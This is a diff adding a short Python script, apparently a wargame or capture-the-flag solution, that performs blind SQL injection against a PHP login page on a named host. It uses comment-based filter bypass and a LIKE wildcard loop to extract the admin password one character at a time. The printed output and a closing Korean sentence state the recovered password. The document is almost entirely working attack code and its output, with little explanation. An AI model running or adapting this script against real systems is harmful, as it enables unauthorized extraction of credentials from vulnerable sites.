@@ -1,0 +1,31 @@
+import requests
+fdsa=""
+while True:
+    for i in range(128):
+        code="http://web.isangxcaution.xyz:20300/sql3.php?pw=%"+"f1'/**/or/**/id='admin'/**/and/**/pw/**/like/**/'"+fdsa+chr(i)+"%"
+        req = requests.get(code)
+        if "Hello ~ Are you Admin?" in req.text and chr(i) not in ["%","_"]:
+            fdsa+=chr(i)
+            print(fdsa)
+            break
+            
+            
+
+하면
+
+0
+07
+07A
+07A8
+07A89
+07A89D
+07A89DE
+07A89DE3
+07A89DE3#
+07A89DE3#
+07A89DE3#
+07A89DE3#
+07A89DE3#
+07A89DE3#
+07A89DE3#
+07A89DE3#가 출력되니 우리는 blind sqli로 07a89de3이 비번임을 알 수 있다.
